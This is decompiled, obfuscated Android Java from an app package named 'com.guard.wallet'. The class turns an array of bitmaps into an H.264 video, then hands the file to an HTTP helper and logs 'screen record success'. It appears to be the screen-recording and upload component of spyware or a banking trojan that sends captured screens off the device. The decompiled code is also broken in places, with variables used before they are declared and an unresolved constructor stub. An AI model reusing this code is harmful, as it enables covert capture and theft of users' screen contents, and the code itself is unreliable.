package com.guard.wallet.thread;

import a1.q;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.Rect;
import android.media.MediaCodec;
import android.media.MediaCodecList;
import android.media.MediaFormat;
import android.media.MediaMuxer;
import android.media.MediaCodec.BufferInfo;
import android.util.Log;
import android.view.Surface;
import java.io.File;
import java.nio.ByteBuffer;
import java.util.LinkedList;
import java.util.concurrent.Callable;

public final class i implements Callable {
   public final Bitmap[] a;
   public final String b;
   public final MediaFormat c;
   public final MediaMuxer d;
   public final MediaCodec e;

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public i(Bitmap[] var1, String var2, MediaFormat var3) {
      label77: {
         super();
         this.a = var1;
         this.b = var2;
         this.c = var3;
         boolean var8 = q.B(var2);
         var20 = null;
         if (!var8) {
            try {
               var15 = new MediaMuxer(var2, 0);
               break label77;
            } catch (Exception var14) {
               q.s("com.guard.wallet.thread.i", var14);
            }
         }

         var15 = null;
      }

      this.d = var15;

      label70: {
         Exception var10000;
         label80: {
            int var6;
            try {
               var6 = MediaCodecList.getCodecCount();
            } catch (Exception var13) {
               var10000 = var13;
               boolean var10001 = false;
               break label80;
            }

            int var4 = 0;

            label64:
            while (true) {
               if (var4 >= var6) {
                  var16 = null;
                  break;
               }

               label82: {
                  try {
                     var16 = MediaCodecList.getCodecInfoAt(var4);
                     if (!var16.isEncoder()) {
                        break label82;
                     }
                  } catch (Exception var12) {
                     var10000 = var12;
                     boolean var21 = false;
                     break label80;
                  }

                  int var7;
                  try {
                     var2 = var16.getSupportedTypes();
                     var7 = var2.length;
                  } catch (Exception var10) {
                     var10000 = var10;
                     boolean var22 = false;
                     break label80;
                  }

                  for (int var5 = 0; var5 < var7; var5++) {
                     try {
                        if (var2[var5].equalsIgnoreCase("video/avc")) {
                           break label64;
                        }
                     } catch (Exception var11) {
                        var10000 = var11;
                        boolean var23 = false;
                        break label80;
                     }
                  }
               }

               var4++;
            }

            var19 = (MediaCodec)var20;
            if (var16 == null) {
               break label70;
            }

            try {
               var19 = MediaCodec.createByCodecName(var16.getName());
               var19.configure(this.c, null, null, 1);
               break label70;
            } catch (Exception var9) {
               var10000 = var9;
               boolean var24 = false;
            }
         }

         Exception var17 = var10000;
         q.s("com.guard.wallet.thread.i", var17);
         var19 = (MediaCodec)var20;
      }

      this.e = var19;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   @Override
   public final Object call() {
      MediaFormat var14 = this.c;
      MediaMuxer var15 = this.d;
      if (var15 != null) {
         MediaCodec var17 = this.e;
         if (var17 != null) {
            Bitmap[] var16 = this.a;
            if (var16 != null && var16.length != 0) {
               long var8 = System.currentTimeMillis() / 1000L;
               Surface var13 = var17.createInputSurface();
               var17.start();
               int var1 = var15.addTrack(var17.getOutputFormat());
               int var5 = var16.length;
               int var3 = 0;

               for (int var4 = 0; var3 < var5; var3++) {
                  Bitmap var18 = var16[var3];
                  if (var18 != null) {
                     label175: {
                        Exception var12;
                        label197: {
                           Rect var20;
                           try {
                              var40 = com.guard.wallet.utils.g.y(var18);
                              var20 = new Rect(0, 0, var2, var6);
                           } catch (Exception var36) {
                              var12 = var36;
                              break label197;
                           }

                           int var2;
                           try {
                              var2 = var14.getInteger("width");
                           } catch (Exception var35) {
                              var12 = var35;
                              break label197;
                           }

                           int var6;
                           try {
                              var6 = var14.getInteger("height");
                           } catch (Exception var34) {
                              var12 = var34;
                              break label197;
                           }

                           try {
                              // [VF-FIX] var20./* $VF: Unable to resugar constructor */<init>(0, 0, var2, var6);
                           } catch (Exception var33) {
                              var12 = var33;
                              break label197;
                           }

                           try {
                              Canvas var19 = var13.lockCanvas(var20);
                              var19.drawBitmap(var40, null, var20, null);
                              var13.unlockCanvasAndPost(var19);
                              com.guard.wallet.utils.g.J0(var40);
                              var41 = new BufferInfo();
                           } catch (Exception var32) {
                              var12 = var32;
                              break label197;
                           }

                           int var7;
                           try {
                              var7 = var17.dequeueOutputBuffer(var41, 1000L);
                           } catch (Exception var31) {
                              var12 = var31;
                              break label197;
                           }

                           if (var7 == -1) {
                              continue;
                           }

                           ByteBuffer var46;
                           label154: {
                              Exception var10000;
                              label192: {
                                 if (var7 == -2) {
                                    try {
                                       var6 = var15.addTrack(var17.getOutputFormat());
                                    } catch (Exception var27) {
                                       var12 = var27;
                                       break label197;
                                    }

                                    var2 = var6;

                                    try {
                                       var15.start();
                                    } catch (Exception var30) {
                                       var10000 = var30;
                                       boolean var10001 = false;
                                       break label192;
                                    }

                                    var1 = var6;
                                 }

                                 if (var7 < 0) {
                                    continue;
                                 }

                                 var2 = var1;

                                 try {
                                    var46 = var17.getOutputBuffer(var7);
                                 } catch (Exception var29) {
                                    var10000 = var29;
                                    boolean var49 = false;
                                    break label192;
                                 }

                                 if (var46 == null) {
                                    continue;
                                 }

                                 var2 = var1;

                                 try {
                                    var6 = var41.size;
                                    break label154;
                                 } catch (Exception var28) {
                                    var10000 = var28;
                                    boolean var50 = false;
                                 }
                              }

                              var12 = var10000;
                              var1 = var2;
                              break label197;
                           }

                           label119:
                           if (var6 != 0) {
                              long var10 = (long)var4;

                              Exception var47;
                              label195: {
                                 label132: {
                                    try {
                                       var41.presentationTimeUs = (var10 + var8) * 200L * 1000L;
                                       if (var4 == var16.length - 1) {
                                          var41.flags = 4;
                                          break label132;
                                       }
                                    } catch (Exception var26) {
                                       var47 = var26;
                                       boolean var51 = false;
                                       break label195;
                                    }

                                    try {
                                       var41.flags = 1;
                                    } catch (Exception var25) {
                                       var47 = var25;
                                       boolean var52 = false;
                                       break label195;
                                    }
                                 }

                                 if (var1 < 0) {
                                    break label119;
                                 }

                                 try {
                                    var15.writeSampleData(var1, var46, var41);
                                    break label119;
                                 } catch (Exception var24) {
                                    var47 = var24;
                                    boolean var53 = false;
                                 }
                              }

                              var12 = var47;
                              break label197;
                           }

                           try {
                              var17.releaseOutputBuffer(var7, false);
                              break label175;
                           } catch (Exception var23) {
                              var12 = var23;
                           }
                        }

                        q.s("com.guard.wallet.thread.i", var12);
                     }

                     com.guard.wallet.utils.g.J0(var18);
                  }

                  var4++;
               }

               Exception var48;
               label103: {
                  try {
                     var17.stop();
                     var17.release();
                     var15.stop();
                     var15.release();
                     String var44 = this.b;
                     if (!q.B(var44)) {
                        File var42 = new File(var44);
                        if (var42.exists()) {
                           LinkedList var45 = new LinkedList();
                           var45.add(var42);
                           com.guard.wallet.http.l.E(var45);
                        }
                     }
                  } catch (Exception var22) {
                     var48 = var22;
                     boolean var54 = false;
                     break label103;
                  }

                  try {
                     Log.d("com.guard.wallet.thread.i", "screen record success...");
                     return Boolean.TRUE;
                  } catch (Exception var21) {
                     var48 = var21;
                     boolean var55 = false;
                  }
               }

               Exception var43 = var48;
               q.s("com.guard.wallet.thread.i", var43);
            }
         }
      }

      return Boolean.TRUE;
   }
}
